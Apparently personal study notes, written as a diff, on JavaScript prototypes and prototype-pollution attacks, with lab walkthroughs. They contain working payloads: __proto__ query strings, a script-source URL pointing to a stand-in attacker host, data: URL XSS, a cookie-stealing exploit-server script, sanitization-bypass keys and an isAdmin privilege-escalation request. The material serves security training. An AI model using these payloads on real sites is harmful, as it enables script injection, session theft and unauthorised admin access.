@@ -1,0 +1,887 @@
+> JavaScript prototypes and inheritance
+
+
+JavaScript uses a prototypal inheritance model, which is quite different from the class-based model used by many other languages.
+
+-
+
+What is an object in JavaScript?
+
+A JavaScript object is essentially just a collection of key:value pairs known as "properties". For example, the following object could represent a user:
+
+
+const user =  {
+    username: "wiener",
+    userId: 01234,
+    isAdmin: false
+}
+
+
+
+
+You can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys:
+
+user.username     // "wiener"
+user['userId']    // 01234
+
+
+
+
+As well as data, properties may also contain executable functions. In this case, the function is known as a "method".
+
+
+const user =  {
+    username: "wiener",
+    userId: 01234,
+    exampleMethod: function(){
+        // do something
+    }
+}
+
+
+The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. 
+However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals. 
+
+-
+
+What is a prototype in JavaScript?
+
+Every object in JavaScript is linked to another object of some kind, known as its prototype. 
+By default, JavaScript automatically assigns new objects one of its built-in prototypes. 
+
+For example, strings are automatically assigned the built-in String.prototype. You can see some more examples of these global prototypes below:
+
+
+let myObject = {};
+Object.getPrototypeOf(myObject);    // Object.prototype
+
+let myString = "";
+Object.getPrototypeOf(myString);    // String.prototype
+
+let myArray = [];
+Object.getPrototypeOf(myArray);	    // Array.prototype
+
+let myNumber = 1;
+Object.getPrototypeOf(myNumber);    // Number.prototype
+
+
+
+Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. 
+This enables developers to create new objects that can reuse the properties and methods of existing objects.
+
+The built-in prototypes provide useful properties and methods for working with basic data types. 
+For example, the String.prototype object has a toLowerCase() method. 
+As a result, all strings automatically have a ready-to-use method for converting them to lowercase. This saves developers having to manually add this behavior to each new string that they create. 
+
+-
+
+How does object inheritance work in JavaScript?
+
+Whenever you reference a property of an object, the JavaScript engine first tries to access this directly on the object itself. 
+If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead. 
+
+Given the following objects, this enables you to reference myObject.propertyA, for example: 
+
+
+existingObject  ----------------------------------> myObject
+propertyA               is prototype of             propertyC
+property
+
+
+
+You can use your browser console to see this behavior in action. First, create a completely empty object:
+let myObject = {};
+
+Next, type myObject followed by a dot. Notice that the console prompts you to select from a list of properties and methods.
+Even though there are no properties or methods defined for the object itself, it has inherited some from the built-in Object.prototype
+
+-
+
+The prototype chain
+
+Note that an object's prototype is just another object, which should also have its own prototype, and so on. 
+As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null. 
+
+Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. 
+In the example above[check image], this means that the username object has access to the properties and methods of both String.prototype and Object.prototype
+
+-
+
+Accessing an object's prototype using __proto__
+
+Every object has a special property that you can use to access its prototype. 
+Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers. 
+If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. 
+This means you can use it to read the prototype and its properties, and even reassign them if necessary.
+
+As with any property, you can access __proto__ using either bracket or dot notation:
+
+username.__proto__
+username['__proto__']
+
+You can even chain references to __proto__ to work your way up the prototype chain:
+
+username.__proto__                        // String.prototype
+username.__proto__.__proto__              // Object.prototype
+username.__proto__.__proto__.__proto__    // null
+
+-
+
+Modifying prototypes
+
+Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. 
+This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.
+
+For example, modern JavaScript provides the trim() method for strings, which enables you to easily remove any leading or trailing whitespace. 
+Before this built-in method was introduced, developers sometimes added their own custom implementation of this behavior to the String.prototype object by doing something like this:
+
+
+String.prototype.removeWhitespace = function(){
+    // remove leading and trailing whitespace
+}
+
+
+Thanks to the prototypal inheritance, all strings would then have access to this method:
+
+let searchTerm = "  example ";
+searchTerm.removeWhitespace();    // "example"
+
+-
+
+What next?
+
+Now that you have a basic understanding of how prototypes and inheritance work in JavaScript, let's take a look at how implementation flaws can lead to a security vulnerability known as prototype pollution.
+
+-
+
+* Prototype Pollution occurs when an attacker is able to modify the prototype of JavaScript objects, typically via the Object.prototype, which affects all objects that inherit from it.
+
+-
+
+How do prototype pollution vulnerabilities arise?
+
+Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. 
+This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.
+
+Due to the special meaning of __proto__ in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. 
+As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
+
+It's possible to pollute any prototype object, but this most commonly occurs with the built-in global Object.prototype.
+
+
+Successful exploitation of prototype pollution requires the following key components:
+
+    1. A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
+
+    2. A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
+
+    3. An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.
+
+
+
+🧠 Example:
+
+Suppose the app does something like:
+
+if (options.isAdmin) {
+  grantAccess();
+}
+
+
+If you pollute Object.prototype like this:
+
+let payload = JSON.parse('{ "__proto__": { "isAdmin": true } }');
+Object.assign({}, payload);
+
+
+Now, any object (including options) will have isAdmin: true, even if it was never set explicitly.
+
+In this case:
+
+    isAdmin is the gadget — the useful property you injected
+
+    The if (options.isAdmin) check is the sink — the code that uses it
+
+    And the payload is the pollution source
+
+-
+
+1. Prototype pollution sources
+
+A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:
+
+   1. The URL via either the query or fragment string (hash)
+
+   2. JSON-based input
+
+   3.  Web messages
+
+
+
+
+1.1 Prototype pollution via the URL
+
+
+An attacker can craft a URL like:
+
+https://vulnerable-website.com/?__proto__[evilProperty]=payload
+
+
+If the app parses this query and merges it into an object, something dangerous can happen.
+
+
+JavaScript sees `__proto__` as a special reference to the prototype, so this happens:
+
+Object.prototype.evilProperty = 'payload';
+
+
+Now, all objects inherit `evilProperty`, unless they override it.
+
+While `evilProperty` may do nothing, an attacker can instead inject useful properties (like `isAdmin`, `toString`, etc.) used by the app or its libraries — leading to logic bugs, DoS, or worse.
+
+
+
+
+1.2 Prototype pollution via JSON input
+
+User-controllable objects are often derived from a JSON string using the JSON.parse() method. 
+Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__. This provides another potential vector for prototype pollution. 
+
+
+
+🧪 Step-by-step breakdown:
+
+1. An attacker sends this JSON input, for example, via a web message:
+
+
+{
+  "__proto__": {
+    "evilProperty": "payload"
+  }
+}
+
+
+2. The app parses it with:
+
+const userData = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
+
+
+
+
+Now, `userData` looks like:
+
+{
+  __proto__: {
+    evilProperty: 'payload'
+  }
+}
+
+
+Note: `__proto__` here is just a normal key in the object — nothing dangerous *yet*.
+
+
+
+
+😈 When does it become dangerous?
+
+The danger comes later, if the app does something like:
+
+Object.assign(targetObject, userData);
+
+
+or uses a deep merge function (like `_.merge()` from Lodash).
+That’s when JavaScript sees `__proto__` as special, and instead of adding it as a property, it modifies the prototype:
+
+targetObject.__proto__.evilProperty = "payload";
+
+
+Which is the same as:
+
+Object.prototype.evilProperty = "payload";
+
+
+Now every object in the app inherits `evilProperty`.
+
+
+
+
+🧪 Key difference:
+
+const objectLiteral = { __proto__: { evilProperty: "payload" } };
+const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
+
+objectLiteral.hasOwnProperty('__proto__'); // false
+objectFromJson.hasOwnProperty('__proto__'); // true
+
+
+
+
+Why?
+
+* In object literals, JavaScript treats `__proto__` as special — it sets the prototype.
+* In JSON.parse(), it treats it as a normal key.
+
+But when that parsed object is later merged into another object, then the pollution happens.
+
+
+
+🔥 Summary
+
+* `JSON.parse()` itself is safe — it treats `__proto__` as a string key.
+* The problem happens later when merging that object into another one without filtering dangerous keys.
+* That’s how JSON input can be used to pollute prototypes.
+
+
+-
+
+
+2. Prototype pollution sinks
+
+A sink is any JavaScript function or DOM element that can be influenced through polluted prototype properties, allowing things like code or command execution.
+
+Since prototype pollution gives control over normally unreachable properties, it can expose dangerous sinks that developers assume are safe — often with little or no input filtering.
+
+
+-
+
+
+3. Prototype pollution gadgets
+
+A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
+
+    Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
+
+    Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
+
+
+A property cannot be a gadget if it is defined directly on the object itself. 
+In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. 
+Robust websites may also explicitly set the prototype of the object to null, which ensures that it doesn't inherit any properties at all. 
+
+
+
+
+Example of a prototype pollution gadget
+
+If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:
+
+let transport_url = config.transport_url || defaults.transport_url;
+
+
+
+Now imagine the library code uses this transport_url to add a script reference to the page:
+
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+
+
+
+If the website's developers haven't set a transport_url property on their config object, this is a potential gadget. 
+In cases where an attacker is able to pollute the global Object.prototype with their own transport_url property, 
+this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing.
+
+
+If the prototype can be polluted via a query parameter, for example, 
+the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
+
+https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+
+
+
+By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:
+
+https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+
+
+    data: → scheme
+
+    , → separates metadata from content
+
+    alert(1);// → is the actual data
+
+
+*
+🔍 What is a data: URI?
+
+A data: URI allows you to include inline data in the URL itself.
+
+The basic format is:
+
+data:[<mediatype>][;base64],<data>
+
+
+Examples:
+
+<img src="data:text/plain,Hello">
+<img src="data:text/html,<script>alert(1)</script>">
+*
+
+
+Here, the metadata (e.g., MIME type) is omitted, so it defaults to text/plain;charset=US-ASCII.
+
+Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix. 
+
+
+---
+
+
+What next?
+
+Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications:
+
+1. Client-side prototype pollution vulnerabilities
+2. Server-side prototype pollution
+
+
+-
+
+
+
+
+
+1. Client-side prototype pollution vulnerabilities
+
+
+
+
+
+
+a> Finding client-side prototype pollution sources manually
+
+It is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to Object.prototype until you find a source that works.
+
+When testing for client-side vulnerabilities, this involves the following high-level steps:
+
+    1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
+
+    vulnerable-website.com/?__proto__[foo]=bar
+
+    2. In your browser console, inspect Object.prototype to see if you have successfully polluted it with your arbitrary property:
+
+    Object.prototype.foo
+
+    // "bar" indicates that you have successfully polluted the prototype
+    // undefined indicates that the attack was not successful
+
+    3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
+
+    vulnerable-website.com/?__proto__.foo=bar
+
+    4. Repeat this process for each potential source.
+
+
+
+Tip: If neither of these techniques is successful, you may still be able to pollute the prototype via its constructor. We'll cover how to do this in more detail later. 
+
+
+Note: Manually finding prototype pollution sources can be tedious. Instead, use DOM Invader (built into Burp’s browser) — it automatically tests for sources as you browse, saving time and effort.
+
+
+
+
+
+b> Finding client-side prototype pollution gadgets manually
+
+
+^
+🔧 Does the gadget have to already exist in the app?
+
+Yes — the gadget must already exist in the app (or its libraries).
+
+
+
+
+🤔 Is a gadget just a key:value pair?
+
+Not exactly — but you're very close.
+
+
+💡 Think of it like this:
+
+* The key you inject (e.g. `isAdmin`, `toString`, `debugMode`) is often part of the gadget.
+* The value you set (e.g. `true`, `null`, or some payload) is what triggers the behavior.
+
+
+But...
+
+
+🧠 The gadget as a whole refers to:
+
+> Existing code in the app that uses a property in a dangerous way, combined with your ability to set that property via prototype pollution.
+
+
+So:
+
+{
+  "__proto__": {
+    "isAdmin": true
+  }
+}
+
+
+* `isAdmin: true` is the key:value pair you inject
+* The app code that says `if (user.isAdmin)` is the gadget
+* Together, they make the attack work
+
+
+
+ ✅ Summary:
+
+* A gadget uses the key:value pair.
+* You control the key:value pair via pollution.
+* But the gadget must already exist in the app or its libraries.
+^
+
+
+
+
+Note: As you can see from the previous steps, manually identifying prototype pollution gadgets in the wild can be a laborious task. 
+Given that websites often rely on a number of third-party libraries, this may involve reading through thousands of lines of minified or obfuscated code, which makes things even trickier. 
+DOM Invader can automatically scan for gadgets on your behalf and can even generate a DOM XSS proof-of-concept in some cases. This means you can find exploits on real-world sites in a matter of seconds rather than hours. 
+
+
+-
+
+
+Lab 1: DOM XSS via client-side prototype pollution
+
+    1. Find a source that you can use to add arbitrary properties to the global Object.prototype.
+
+    2. Identify a gadget property that allows you to execute arbitrary JavaScript.
+
+    3. Combine these to call alert().
+
+
+-
+
+
+Prototype pollution via the constructor
+
+So far, we've looked exclusively at how you can get a reference to prototype objects via the special __proto__ accessor property. 
+As this is the classic technique for prototype pollution, a common defense is to strip any properties with the key __proto__ from user-controlled objects before merging them. 
+This approach is flawed as there are alternative ways to reference Object.prototype without relying on the __proto__ string at all.
+
+Unless its prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the constructor function that was used to create it. 
+For example, you can create a new object either using literal syntax or by explicitly invoking the Object() constructor as follows:
+
+let myObjectLiteral = {};
+let myObject = new Object();
+
+
+You can then reference the Object() constructor via the built-in constructor property:
+
+myObjectLiteral.constructor            // function Object(){...}
+myObject.constructor                   // function Object(){...}
+
+
+Remember that functions are also just objects under the hood. Each constructor function has a prototype property, which points to the prototype that will be assigned to any objects that are created by this constructor. 
+As a result, you can also access any object's prototype as follows:
+
+myObject.constructor.prototype        // Object.prototype
+myString.constructor.prototype        // String.prototype
+myArray.constructor.prototype         // Array.prototype
+
+
+As myObject.constructor.prototype is equivalent to myObject.__proto__, this provides an alternative vector for prototype pollution. 
+
+
+-
+
+
+Bypassing flawed key sanitization
+
+An obvious way in which websites attempt to prevent prototype pollution is by sanitizing property keys before merging them into an existing object. 
+However, a common mistake is failing to recursively sanitize the input string. For example, consider the following URL:
+
+vulnerable-website.com/?__pro__proto__to__.gadget=payload
+
+
+If the sanitization process just strips the string __proto__ without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source:
+
+vulnerable-website.com/?__proto__.gadget=payload
+
+
+-
+
+
+Lab 3: Client-side prototype pollution via flawed sanitization
+
+
+> Find a prototype pollution source
+
+1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string:
+/?__proto__.foo=bar
+
+2. Open the browser DevTools panel and go to the Console tab.
+3. Enter Object.prototype .
+4. Study the properties of the returned object and observe that your injected foo property has not been added.
+
+5. Try alternative prototype pollution vectors. For example:
+/?__proto__[foo]=bar
+/?constructor.prototype.foo=bar
+
+6. Observe that in each instance, Object.prototype is not modified.
+
+7. Go to the Sources tab and study the JavaScript files that are loaded by the target site. Notice that
+deparamSanitized.js uses the sanitizeKey() function defined in searchLoggerFiltered.js to strip
+potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.
+
+8. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the
+sanitization process. For example:
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+
+9. In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar .
+You've successfully found a prototype pollution source and bypassed the website's key sanitization.
+
+
+> Identify a gadget
+
+1. Study the JavaScript files again and notice that searchLogger.js dynamically appends a script to the DOM using
+the config object's transport_url property if present.
+2. Notice that no transport_url property is set for the config object. This is a potential gadget.
+
+
+> Craft an exploit
+
+1. Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property:
+/?__pro__proto__to__[transport_url]=foo
+
+2. In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a
+<script> element has been rendered on the page, with the src attribute foo.
+
+3. Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as
+follows:
+/?__pro__proto__to__[transport_url]=data:,alert(1);
+4. Observe that the alert(1) is called and the lab is solved.
+
+
+-
+
+
+Prototype pollution in external libraries   [based on real-world vuln]
+
+As we've touched on already, prototype pollution gadgets may occur in third-party libraries that are imported by the application. 
+In this case, we strongly recommend using DOM Invader's prototype pollution features to identify sources and gadgets. 
+Not only is this much quicker, it also ensures you won't miss vulnerabilities that would otherwise be extremely tricky to notice. 
+
+
+To solve the lab:
+
+1.	Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
+
+2. Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.
+
+
+
+Lab 4: Client-side prototype pollution in third-party libraries
+
+1. Load the lab in Burp's built-in browser.
+2. Enable DOM Invader and enable the prototype pollution option.
+3. Open the browser DevTools panel, go to the DOM Invader tab, then reload the page.
+4. Observe that DOM Invader has identified two prototype pollution vectors in the hash property i.e. the URL fragment string.
+5. Click Scan for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
+6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.
+7. Observe that DOM Invader has successfully accessed the setTimeout() sink via the hitCallback gadget.
+8. Click Exploit. DOM Invader automatically generates a proof-of-concept exploit and calls alert(1) .
+9. Disable DOM Invader.
+10. In the browser, go to the lab's exploit server.
+
+11. In the Body section, craft an exploit that will navigate the victim to a malicious URL as follows:
+
+<script>
+    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+</script>
+
+12. Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the alert(document.cookie) payload is triggered.
+
+13. Go back to the exploit server and deliver the exploit to the victim to solve the lab.
+
+
+-
+
+
+
+
+
+
+2. Server-side prototype pollution vulnerabilities
+
+
+
+
+
+In this section, you'll learn a number of techniques for black-box detection of server-side prototype pollution. 
+We'll cover how to do this efficiently and non-destructively, then use interactive, deliberately vulnerable labs to demonstrate how you can leverage prototype pollution for remote code execution. 
+
+
+
+
+-
+
+Why is server-side prototype pollution more difficult to detect?
+
+due to:
+
+* No source access – You can’t see server code to spot sinks or gadgets.
+* No DevTools – You can’t inspect objects live like in a browser.
+* Risk of DoS – Testing may crash the app or break functionality.
+* No reset – Pollution persists until the server restarts; no easy way to undo.
+
+These challenges make detection and safe testing more difficult, especially in black-box scenarios.
+
+In the following sections, we'll cover a number of non-destructive techniques that enable you to safely test for server-side prototype pollution despite these limitations. 
+
+
+-
+
+
+Detecting server-side prototype pollution via polluted property reflection
+
+An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, 
+including ones that it has inherited via the prototype chain. 
+
+
+You can test this out for yourself as follows:
+
+const myObject = { a: 1, b: 2 };
+
+// pollute the prototype with an arbitrary property
+Object.prototype.foo = 'bar';
+
+// confirm myObject doesn't have its own foo property
+myObject.hasOwnProperty('foo'); // false
+
+// list names of properties of myObject
+for(const propertyKey in myObject){
+    console.log(propertyKey);
+}
+
+// Output: a, b, foo
+
+
+
+
+This also applies to arrays, where a for...in loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well. 
+
+const myArray = ['a','b'];
+Object.prototype.foo = 'bar';
+
+for(const arrayKey in myArray){
+    console.log(arrayKey);
+}
+
+// Output: 0, 1, foo
+
+
+
+
+In either case, if the application later includes the returned properties in a response, this can provide a simple way to probe for server-side prototype pollution.
+
+
+POST or PUT requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. 
+In this case, you could attempt to pollute the global Object.prototype with an arbitrary property as follows: 
+
+POST /user/update HTTP/1.1
+Host: vulnerable-website.com
+...
+{
+    "user":"wiener",
+    "firstName":"Peter",
+    "lastName":"Wiener",
+    "__proto__":{
+        "foo":"bar"
+    }
+}
+
+
+
+If the website is vulnerable, your injected property would then appear in the updated object in the response: 
+
+HTTP/1.1 200 OK
+...
+{
+    "username":"wiener",
+    "firstName":"Peter",
+    "lastName":"Wiener",
+    "foo":"bar"
+}
+
+
+
+In rare cases, the website may even use these properties to dynamically generate HTML, resulting in the injected property being rendered in your browser.
+
+Once you identify that server-side prototype pollution is possible, you can then look for potential gadgets to use for an exploit. 
+
+*Any features that involve updating user data are worth investigating as these often involve merging the incoming data into an existing object that represents the user within the application. 
+If you can add arbitrary properties to your own user, this can potentially lead to a number of vulnerabilities, including privilege escalation. 
+
+
+
+
+
+Lab 6: Privilege escalation via server-side prototype pollution
+
+To solve the lab:
+
+1.	Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
+2. Identify a gadget property that you can use to escalate your privileges.
+3. Access the admin panel and delete the user carlos.
+
+
+
+
+> Study the address change feature
+
+1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
+2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.
+3. Observe that when you submit the form, the data from the fields is sent to the server as JSON.
+4. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
+5. Send the request to Burp Repeater.
+
+
+
+
+> Identify a prototype pollution source
+
+1. In Repeater, add a new property to the JSON with the name __proto__ , containing an object with an arbitrary
+property:
+
+"__proto__": {
+ "foo":"bar"
+}
+
+2. Send the request.
+3. Notice that the object in the response now includes the arbitrary property that you injected, but no __proto__
+property. This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain.
+
+
+
+
+> Identify a gadget
+
+1. Look at the additional properties in the response body.
+2. Notice the isAdmin property, which is currently set to false.
+
+
+
+
+> Craft an exploit
+
+1. Modify the request to try polluting the prototype with your own isAdmin property:
+
+"__proto__": {
+ "isAdmin":true
+}
+
+2. Send the request. Notice that the isAdmin value in the response has been updated. This suggests that the object doesn't have its own isAdmin property, but has instead inherited it from the polluted prototype.
+3. In the browser, refresh the page and confirm that you now have a link to access the admin panel.
+4. Go to the admin panel and delete carlos to solve the lab.
+
+
+
+-
+
